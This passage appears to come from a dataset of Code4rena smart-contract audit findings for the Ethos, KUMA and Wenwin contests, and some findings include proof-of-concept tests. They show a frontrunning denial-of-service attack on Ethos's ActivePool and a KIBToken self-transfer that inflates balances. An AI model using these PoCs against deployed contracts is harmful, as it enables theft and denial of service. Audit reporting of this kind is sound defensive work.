process `MUST revert if all of assets cannot be withdrawn (due to withdrawal limit being reached, slippage, the owner not having enough shares, etc)`, this makes the `ReaperVaultERC4626` non EIP-4626 compliant.  This might cause integration problems in the future, which can lead to a wide range of issues, including loss of funds.  Because EIP-4626 is aimed to create a consistent and robust implementation pattern for Tokenized Vaults, and even a slight deviation from the standard would break composability (and potentially lead to a loss of funds), this is categorized as a high risk.  ## Tools Used Manual review  ## Recommended Mitigation Steps The `withdraw` and `redeem` functions should be modified to meet the specifications of EIP-4626: the `value` transferred must always be equal to the `assets` withdrawn. In case this is not true, the transaction must be reverted."}, {"title": "DOS by directly transferring assets to Reaper Vault", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/246", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-13"], "target": "2023-02-ethos-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L251 https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L264-L274 https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L207 https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L185   # Vulnerability details  ## Impact Attacker can DOS the protocol by directly transferring assets to the ReaperVault. This causes a DOS by underflow in the `ActivePool._rebalance` logic. All core ActivePool functionality will be disabled including all BorrowerOperations functionality and other functionality that relies on ActivePool. This essentially renders the protocol unusable until the protocol team figures out the fix, which is to directly transfer enough assets to ReaperVault to address the underflow. Even then, the attacker can just repeat the attack and make the protocol unusable once again.   ## Proof of Concept With the below steps, an attacker can DOS the protocol: 1. A trove already exists and an initial deposit to the ReaperVault was already done by the ActivePool. 2. Bob opens a Trove using 190e3 WBTC as collateral (this could be any amount enough to satisfy the minimum borrowing amount of 90 LUSD). 3. Alice (the Attacker) frontruns Bob's openTrove transaction and transfers WBTC directly to the ReaperVault. The amount of assets transferred will be 1 + amount of assets ActivePool will deposit to the ReaperVault based on yieldingPercentage when Bob's openTrove tx is processed. 4. Due to Alice's frontrun, the below branch in `ActivePool._rebalance` will trigger during Bob's `openTrove` transaction: ```solidity         } else if (vars.netAssetMovement < 0) {             IERC4626(yieldGenerator[_collateral]).withdraw(uint256(-vars.netAssetMovement), address(this), address(this));         } ``` `vars.netAssetMovement` will be -1 because of Alice's direct transfer of assets amounting to 1 + ActivePool's deposit amount.  5. Because of Alice's direct transfer of WBTC to ReaperVault, let's say 1 Vault share is now worth 15 units of WBTC. `ReaperVaultERC4626.withdraw` converts assets to shares with some rounding up behavior and then converts those shares to assets again to get the amount withdrawn. This leads to at least 15 units of WBTC being withdrawn even though `vars.netAssetMovement = 1`.  6. It is this difference between the amount of assets withdrawn from the ReaperVault and the accounting for total yield amount (`yieldingAmount[_collateral]`) that causes an underflow in subsequent calls to `ActivePool._rebalance`. The underflow happens here:  ```solidity # `vars.sharesToAssets` is now less than `vars.currentAllocated` and this operation will now always revert due to underflow. # `vars.sharesToAssets` is total assets in the Vault while `vars.currentAllocated` is `yieldingAmount[_collateral]`.  vars.profit = vars.sharesToAssets.sub(vars.currentAllocated); ```  Here is the [git diff](https://gist.githubusercontent.com/gjaldon/460741803d1cb81b7bd76d7240b4ba24/raw/45601e479353f85baa66160104aaca1a54b7a43e/ethos_reserve_dos.patch) for a test POC that shows the attack. To run the POC, do the following:  1. Copy all contents of the gist to `/tmp/changes.patch` 2. Clone the project repo and cd to the Ethos-Core directory. 3. Run `git apply /tmp/changes.patch` in the Ethos-Core directory. 4. Run `npm install` from the command line from Ethos-Core's root directory 5. Run `npx hardhat test --grep \"DOS attack\"`. The test should pass  The git diff is huge since it includes copying of Ethos-Vault contracts into the Ethos-Core project so they can be used within the Ethos-Core tests. The test looks like:  ```js     it(\"DOS attack\", async () => {       await activePool.setYieldingPercentage(collaterals[2].address, 1000, {         from: owner,       });       await activePool.setYieldClaimThreshold(collaterals[2].address, 10000, {         from: owner,       });        await collaterals[2].mint(alice, dec(10_000, 8));       await collaterals[2].approve(borrowerOperations.address, dec(10_000, 8), {         from: alice,       });       await collaterals[2].mint(bob, dec(10_000, 8));       await collaterals[2].approve(borrowerOperations.address, dec(10_000, 8), {         from: bob,       });       await collaterals[2].mint(carol, dec(10_000, 8));       await collaterals[2].approve(borrowerOperations.address, dec(10_000, 8), {         from: carol,       });       await lusdToken.unprotectedMint(alice, dec(100_000, 18));       await lusdToken.unprotectedMint(bob, dec(100_000, 18));        await priceFeed.setPrice(collaterals[2].address, dec(100_000, 18));       const reaperVault = contracts.erc4626vaults[2];       await reaperVault.grantRole(         await reaperVault.DEPOSITOR(),         activePool.address       );        await borrowerOperations.openTrove(         collaterals[2].address,         dec(190, 3),         th._100pct,         dec(90, 18),         alice,         alice,         { from: alice }       );        // Alice frontruns Bob's deposit by transfering 300_001 WBTC to ReaperVault.        // 300_001 WBTC is 1 unit of WBTC more than the yield that is going to be       // deposited to the ReaperVault.       await collaterals[2].transfer(reaperVault.address, 300001, {         from: alice,       });        await borrowerOperations.openTrove(         collaterals[2].address,         dec(3, 6),         th._100pct,         dec(90, 18),         bob,         bob,         { from: bob }       );        // Protocol is now unusable       await assertRevert(         borrowerOperations.closeTrove(collaterals[2].address, {           from: alice,         })       );        await assertRevert(         borrowerOperations.closeTrove(collaterals[2].address, {           from: bob,         })       );        await assertRevert(         borrowerOperations.openTrove(           collaterals[2].address,           dec(190, 3),           th._100pct,           dec(90, 18),           carol,           carol,           { from: carol }         )       );     }); ```   ## Tools Used Manual Review, Hardhat/Truffle, VSCode  ## Recommended Mitigation Steps Changing ReaperVaultERC4626 withdraw to round down instead of up fixes this issue. Below is the fixed code: ```solidity     function previewWithdraw(uint256 assets) public view override returns (uint256 shares) {         if (totalSupply() == 0 || _freeFunds() == 0) return 0;         shares = (assets * totalSupply()) / _freeFunds();     } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/142", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-99"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/Co0nan-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/87", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-103"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/BRONZEDISC-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/27", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-109"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/Sathish9098-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/25", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-110"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/arialblack14-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/23", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-105"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/UdarTeam-Q.md)."}, {"title": "KUMAFeeCollector may emit wrong FeeReleased event", "html_url": "https://github.com/code-423n4/2023-02-kuma-findings/issues/23", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-02-kuma-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMAFeeCollector.sol#L205 https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMAFeeCollector.sol#L219   # Vulnerability details  ## Impact KUMAFeeCollector may emit an event `FeeReleased(availableIncome)` with `availableIncome > 0` when it doesn't actually release any fee.  ## Proof of Concept According to the `_release()` function: ``` function _release(IERC20 KIBToken, uint256 availableIncome) private {     uint256 totalShares = _totalShares;      for (uint256 i; i < _payees.length(); i++) {         address payee = _payees.at(i);         KIBToken.safeTransfer(payee, availableIncome * _shares[payee] / totalShares);     }      emit FeeReleased(availableIncome); } ```  If the length of `_payees` is 0, it will transfer 0 token, but the event `FeeReleased` will always be emitted.   The [KUMAFeeCollector._release()](https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMAFeeCollector.sol#L205) is called by either [KUMAFeeCollector.release()](https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMAFeeCollector.sol#L56) or [KUMAFeeCollector._releaseIfAvailableIncome()](https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMAFeeCollector.sol#L219).  The wrong event will never be emitted when calling `release()` because it will check the length of `_payees` before calling `_release()`: ``` function release() external override {     ...     if (_payees.length() == 0) {         revert Errors.NO_PAYEES();     }     _release(KIBToken, availableIncome); } ```  But, [KUMAFeeCollector._releaseIfAvailableIncome()](https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMAFeeCollector.sol#L219) doesn't check the `_payees` before calling `_release()`. So, the wrong `FeeReleased` event may be emitted through `_releaseIfAvailableIncome()`.  ## Tools Used VS Code  ## Recommended Mitigation Steps We should check `_payees.length()` (is 0 or not) either in [KUMAFeeCollector._releaseIfAvailableIncome()](https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMAFeeCollector.sol#L219) or in [KUMAFeeCollector._release()](https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMAFeeCollector.sol#L205).  "}, {"title": "KUMABondToken.approve() should revert if the owner of the tokenId is blacklisted", "html_url": "https://github.com/code-423n4/2023-02-kuma-findings/issues/22", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-02-kuma-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/mcag-contracts/KUMABondToken.sol#L143   # Vulnerability details  ## Impact It is still possible for a blacklisted user's bond token to be approved.  ## Proof of Concept [KUMABondToken.approve()](https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/mcag-contracts/KUMABondToken.sol#L143) only checks if `msg.sender` and `to` are not blacklisted. It doesn't check if the owner of the `tokenId` is not blacklisted.  For example, the following scenario allows a blacklisted user's bond token to be approved: 1. User A have a bond token bt1. 2. User A calls `KUMABondToken.setApprovalForAll(B, true)`, and user B can operate on all user A's bond tokens. 3. User A is blacklisted. 4. User B calls `KUMABondToken.approve(C, bt1)` to approve user C to operate on bond token bt1.  ## Tools Used VS Code  ## Recommended Mitigation Steps `KUMABondToken.approve()` should revert if the owner of the tokenId is blacklisted:  ``` diff --git a/src/mcag-contracts/KUMABondToken.sol b/src/mcag-contracts/KUMABondToken.sol index 569a042..906fe7b 100644 --- a/src/mcag-contracts/KUMABondToken.sol +++ b/src/mcag-contracts/KUMABondToken.sol @@ -146,6 +146,7 @@ contract KUMABondToken is ERC721, Pausable, IKUMABondToken {          whenNotPaused          notBlacklisted(to)          notBlacklisted(msg.sender) +        notBlacklisted(ERC721.ownerOf(tokenId))      {          address owner = ERC721.ownerOf(tokenId);  ```  "}, {"title": "KUMAFeeCollector.changePayees() executes incorrectly when newPayees contains duplicate items", "html_url": "https://github.com/code-423n4/2023-02-kuma-findings/issues/13", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-02-kuma-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMAFeeCollector.sol#L174-L188   # Vulnerability details  ## Impact When calling [KUMAFeeCollector.changePayees()](https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMAFeeCollector.sol#L152) with duplicate payees in `newPayees`, the call is not reverted and the result state will be incorrect.  ## Proof of Concept Contract [KUMAFeeCollector](https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMAFeeCollector.sol#L14) does not support duplicate payees. The transaction will revert when trying to add duplicate payees in [addPayee()](https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMAFeeCollector.sol#L77): ``` function addPayee(address payee, uint256 share) external override onlyManager {     if (_payees.contains(payee)) {         revert Errors.PAYEE_ALREADY_EXISTS();     }     ... } ```  But, function [KUMAFeeCollector.changePayees()](https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMAFeeCollector.sol#L152) forgets this constraint, which allows duplicate payees to be passed in `newPayees`. This will cause the contract to record an incorrect state and not work properly.  For example, if `newPayees` contains duplicate payee A, all of its shares will be added to `_totalShares`, but `_shares[A]` will only record the last one. As a result, the sum of all recorded `_shares` will less than `_totalShares`.  Test code for PoC: ``` diff --git a/test/kuma-protocol/KUMAFeeCollector.t.sol b/test/kuma-protocol/KUMAFeeCollector.t.sol index f34d9ff..0b3fe46 100644 --- a/test/kuma-protocol/KUMAFeeCollector.t.sol +++ b/test/kuma-protocol/KUMAFeeCollector.t.sol @@ -40,6 +40,39 @@ contract KUMAFeeCollectorTest is BaseSetUp {          );      }  +    function test_DuplicatePayees() public { +        address[] memory newPayees = new address[](4); +        uint256[] memory newShares = new uint256[](4); + +        newPayees[0] = vm.addr(10); +        newPayees[1] = vm.addr(10); +        newPayees[2] = vm.addr(11); +        newPayees[3] = vm.addr(12); +        newShares[0] = 25; +        newShares[1] = 25; +        newShares[2] = 25; +        newShares[3] = 25; + +        _KUMAFeeCollector.changePayees(newPayees, newShares); + +        // only 3 payees +        assertEq(_KUMAFeeCollector.getPayees().length, 3); +        // newPayees[0] and newPayees[1] are identical and both are added as payees[0] +        address[] memory payees = _KUMAFeeCollector.getPayees(); +        assertEq(payees[0], newPayees[1]); +        assertEq(payees[1], newPayees[2]); +        assertEq(payees[2], newPayees[3]); + +        uint256 countedTotalShares = 0; +        for (uint i; i < payees.length; i++) { +            countedTotalShares += _KUMAFeeCollector.getShare(payees[i]); +        } +        // Counted totalShares is 75 (100 - 25) +        assertEq(countedTotalShares, 75); +        // Recorded totalShares is 100 +        assertEq(_KUMAFeeCollector.getTotalShares(), 100); +    } +      function test_initialize() public {          assertEq(address(_KUMAFeeCollector.getKUMAAddressProvider()), address(_KUMAAddressProvider));          assertEq(_KUMAFeeCollector.getRiskCategory(), _RISK_CATEGORY); ```  Outputs: ``` forge test -m test_DuplicatePayees [\u2814] Compiling... No files changed, compilation skipped  Running 1 test for test/kuma-protocol/KUMAFeeCollector.t.sol:KUMAFeeCollectorTest [PASS] test_DuplicatePayees() (gas: 259689) Test result: ok. 1 passed; 0 failed; finished in 7.39ms ```  ## Tools Used VS Code  ## Recommended Mitigation Steps [KUMAFeeCollector.changePayees()](https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMAFeeCollector.sol#L152) should revert if there are duplicates in `newPayees`:  ``` diff --git a/src/kuma-protocol/KUMAFeeCollector.sol b/src/kuma-protocol/KUMAFeeCollector.sol index 402cf71..1a9d86d 100644 --- a/src/kuma-protocol/KUMAFeeCollector.sol +++ b/src/kuma-protocol/KUMAFeeCollector.sol @@ -180,7 +180,9 @@ contract KUMAFeeCollector is IKUMAFeeCollector, UUPSUpgradeable, Initializable {              }               address payee = newPayees[i]; -            _payees.add(payee); +            if (!_payees.add(payee)) { +                revert Errors.PAYEE_ALREADY_EXISTS(); +            }              _shares[payee] = newShares[i];              _totalShares += newShares[i];  ```  "}, {"title": "KUMASwap incorrectly reverts when when _maxCoupons has been reached", "html_url": "https://github.com/code-423n4/2023-02-kuma-findings/issues/10", "labels": ["bug", "2 (Med Risk)", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-02-kuma-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMASwap.sol#L115-L171   # Vulnerability details  ## Impact  Selling bonds with coupons that are already accounted will fail unexpectedly  ## Proof of Concept  https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMASwap.sol#L116-L118          if (_coupons.length() == _maxCoupons) {             revert Errors.MAX_COUPONS_REACHED();         }  The above lines will cause ALL bonds sales to revert when `_coupons.length` has reached `_maxCoupons`. Since bonds may share the same `coupon`, the swap should continue to accept bonds with a `coupon` that already exist in the `_coupons` set.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  sellBond should only revert if the max length has been reached and bond.coupon doesn't already exist:      -   if (_coupons.length() == _maxCoupons) {     +   if (_coupons.length() == _maxCoupons && !_coupons.contains(bond.coupon)) {             revert Errors.MAX_COUPONS_REACHED();         }"}, {"title": "Unnecessary precision loss in redeemKIBT()", "html_url": "https://github.com/code-423n4/2023-02-kuma-findings/issues/5", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden"], "target": "2023-02-kuma-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KUMASwap.sol#L309-L310   # Vulnerability details  ## Impact Unnecessary precision loss in redeemKIBT()  ## Proof of Concept If enter Deprecated mode, user can redeem StableCoin by percentage with redeemKIBT()  The redeemKIBT() implementation code is as follows:  ```solidity     function redeemKIBT(uint256 amount) external override whenDeprecated {         if (amount == 0) {             revert Errors.AMOUNT_CANNOT_BE_ZERO();         }         if (_bondReserve.length() != 0) {             revert Errors.BOND_RESERVE_NOT_EMPTY();         }         IKIBToken KIBToken = IKIBToken(_KUMAAddressProvider.getKIBToken(_riskCategory));         IERC20 deprecationStableCoin = _deprecationStableCoin;          uint256 redeemAmount =             amount.wadMul(_deprecationStableCoin.balanceOf(address(this))).wadDiv(KIBToken.totalSupply());         KIBToken.burn(msg.sender, amount);         deprecationStableCoin.safeTransfer(msg.sender, redeemAmount);          emit KIBTRedeemed(msg.sender, redeemAmount);     } ```  Simplify the formula: ```solidity redeemAmount = (amount * StableCoinBalance / 10**18 ) * 10**18 / totalSupply ```  The above formula ```amount * StableCoinBalance / 10**18 ``` maybe have the possibility of precision loss and StableCoinBalance as usdc's decimals == 6   It is recommended to use ```redeemAmount = amount * StableCoinBalance / totalSupply```  Test code:  ```solidity   function test_precision() external {       uint256 stableCoin = 1_000_000;       uint256 totalSupply = 10_000_000_000;       uint256 amount = totalSupply;               uint256 old = (amount * stableCoin/10**18) * 10**18 / totalSupply;       uint256 new_ = amount * stableCoin / totalSupply;       console.log(\"old formula result :\",old);       console.log(\"new formula result:\",new_);   } ```  ```console forge test --match test_precision -vvv  [PASS] test_precision() (gas: 4632) Logs:   old formula result : 0   new formula result : 1000000  Test result: ok. 1 passed; 0 failed; finished in 917.24\u00b5s ```   ## Tools Used  ## Recommended Mitigation Steps  ```solidity     function redeemKIBT(uint256 amount) external override whenDeprecated {         if (amount == 0) {             revert Errors.AMOUNT_CANNOT_BE_ZERO();         }         if (_bondReserve.length() != 0) {             revert Errors.BOND_RESERVE_NOT_EMPTY();         }         IKIBToken KIBToken = IKIBToken(_KUMAAddressProvider.getKIBToken(_riskCategory));         IERC20 deprecationStableCoin = _deprecationStableCoin;          uint256 redeemAmount = -           amount.wadMul(_deprecationStableCoin.balanceOf(address(this))).wadDiv(KIBToken.totalSupply()); +           amount * _deprecationStableCoin.balanceOf(address(this)) / KIBToken.totalSupply();         KIBToken.burn(msg.sender, amount);         deprecationStableCoin.safeTransfer(msg.sender, redeemAmount);          emit KIBTRedeemed(msg.sender, redeemAmount);     } ```"}, {"title": "TRANSFERING KIBToken TO YOURSELF INCREASES YOUR BALANCE", "html_url": "https://github.com/code-423n4/2023-02-kuma-findings/issues/3", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-02-kuma-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-kuma/blob/3f3d2269fcb3437a9f00ffdd67b5029487435b95/src/kuma-protocol/KIBToken.sol#L290-L291   # Vulnerability details  ## Impact using temporary variables to update balances is a dangerous construction. If transferred to yourself, it will cause your balance to increase, thus growing the token balance infinitely  ## Proof of Concept  KIBToken overrides _transfer() to perform the transfer of the token, the code is as follows:  ```solidity     function _transfer(address from, address to, uint256 amount) internal override {         if (from == address(0)) {             revert Errors.ERC20_TRANSFER_FROM_THE_ZERO_ADDRESS();         }         if (to == address(0)) {             revert Errors.ERC20_TRANSER_TO_THE_ZERO_ADDRESS();         }         _refreshCumulativeYield();         _refreshYield();          uint256 startingFromBalance = this.balanceOf(from);         if (startingFromBalance < amount) {             revert Errors.ERC20_TRANSFER_AMOUNT_EXCEEDS_BALANCE();         }         uint256 newFromBalance = startingFromBalance - amount;         uint256 newToBalance = this.balanceOf(to) + amount;          uint256 previousEpochCumulativeYield_ = _previousEpochCumulativeYield;         uint256 newFromBaseBalance = WadRayMath.wadToRay(newFromBalance).rayDiv(previousEpochCumulativeYield_);         uint256 newToBaseBalance = WadRayMath.wadToRay(newToBalance).rayDiv(previousEpochCumulativeYield_);          if (amount > 0) {             _totalBaseSupply -= (_baseBalances[from] - newFromBaseBalance);             _totalBaseSupply += (newToBaseBalance - _baseBalances[to]);             _baseBalances[from] = newFromBaseBalance;             _baseBalances[to] = newToBaseBalance;//<--------if from==to,this place Will overwrite the reduction above         }          emit Transfer(from, to, amount);     } ``` From the code above we can see that using temporary variables \"newToBaseBalance\" to update balances  Using temporary variables is a dangerous construction.  If the from and to are the same, the balance[to] update will overwrite the balance[from] update simplify the example:  Suppose: balance[alice]=10 ,  and execute transferFrom(from=alice,to=alice,5) Define the temporary variable:  temp_variable = balance[alice]=10 so update the steps as follows:  1.balance[to=alice] = temp_variable - 5 =5 2.balance[from=alice] = temp_variable + 5 =15  after alice transferred it to herself, the balance was increased by 5  The test code is as follows:  add to KIBToken.transfer.t.sol ```soldity     //test from == to     function test_transfer_same() public {         _KIBToken.mint(_alice, 10 ether);         assertEq(_KIBToken.balanceOf(_alice), 10 ether);         vm.prank(_alice);         _KIBToken.transfer(_alice, 5 ether);   //<-----alice transfer to alice          assertEq(_KIBToken.balanceOf(_alice), 15 ether); //<-----increases 5 eth     } ``` ```console forge test --match test_transfer_same -vvv  Running 1 test for test/kuma-protocol/kib-token/KIBToken.transfer.t.sol:KIBTokenTransfer [PASS] test_transfer_same() (gas: 184320) Test result: ok. 1 passed; 0 failed; finished in 24.67ms ```   ## Tools Used  ## Recommended Mitigation Steps  a more general method is use: ```solidity balance[to]-=amount balance[from]+=amount ```  In view of the complexity of the amount calculation, if the code is to be easier to read, it is recommended\uff1a  ```solidity     function _transfer(address from, address to, uint256 amount) internal override {         if (from == address(0)) {             revert Errors.ERC20_TRANSFER_FROM_THE_ZERO_ADDRESS();         }         if (to == address(0)) {             revert Errors.ERC20_TRANSER_TO_THE_ZERO_ADDRESS();         }         _refreshCumulativeYield();         _refreshYield();  +       if (from != to) {          uint256 startingFromBalance = this.balanceOf(from);          if (startingFromBalance < amount) {              revert Errors.ERC20_TRANSFER_AMOUNT_EXCEEDS_BALANCE();          }          uint256 newFromBalance = startingFromBalance - amount;          uint256 newToBalance = this.balanceOf(to) + amount;           uint256 previousEpochCumulativeYield_ = _previousEpochCumulativeYield;          uint256 newFromBaseBalance = WadRayMath.wadToRay(newFromBalance).rayDiv(previousEpochCumulativeYield_);          uint256 newToBaseBalance = WadRayMath.wadToRay(newToBalance).rayDiv(previousEpochCumulativeYield_);           if (amount > 0) {              _totalBaseSupply -= (_baseBalances[from] - newFromBaseBalance);              _totalBaseSupply += (newToBaseBalance - _baseBalances[to]);              _baseBalances[from] = newFromBaseBalance;              _baseBalances[to] = newToBaseBalance;          } +       }         emit Transfer(from, to, amount);     } ```"}, {"title": "Upgraded Q -> 2 from #345 [1678798679676]", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/522", "labels": ["2 (Med Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-03-wenwin-findings", "body": "Judge has assessed an item in Issue #345 as 2 risk. The relevant finding follows:   Issue #2 - Undermining the fairness of the protocol in swapSource() and possibilities for stealing a jackpot"}, {"title": "Upgraded Q -> 2 from #345 [1678798666534]", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/521", "labels": ["2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-03-wenwin-findings", "body": "Judge has assessed an item in Issue #345 as 2 risk. The relevant finding follows:   Issue #1 - An attacker can leave the protocol in a \"drawing\" state for extended period of time"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/489", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-02"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/juancito-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/485", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-05"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/seeu-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/453", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-08"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/lukris02-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/444", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-02"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/adriro-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/443", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-04"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/adriro-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/439", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-04"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/0xSmartContract-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/435", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-13"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/nadin-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/433", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-14"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/horsefacts-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/429", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-16"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/MohammedRizwan-Q.md)."}, {"title": "Constant DRAWS_PER_YEAR will break if drawPeriod != 1 week", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/408", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-03-wenwin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-wenwin/blob/main/src/LotteryMath.sol#L24 https://github.com/code-423n4/2023-03-wenwin/blob/main/src/Lottery.sol#L164-L166 https://github.com/code-423n4/2023-03-wenwin/blob/main/src/Lottery.sol#L271-L277   # Vulnerability details  ## Constant DRAWS_PER_YEAR will break if drawPeriod != 1 week Currently the constant `DRAWS_PER_YEAR` is 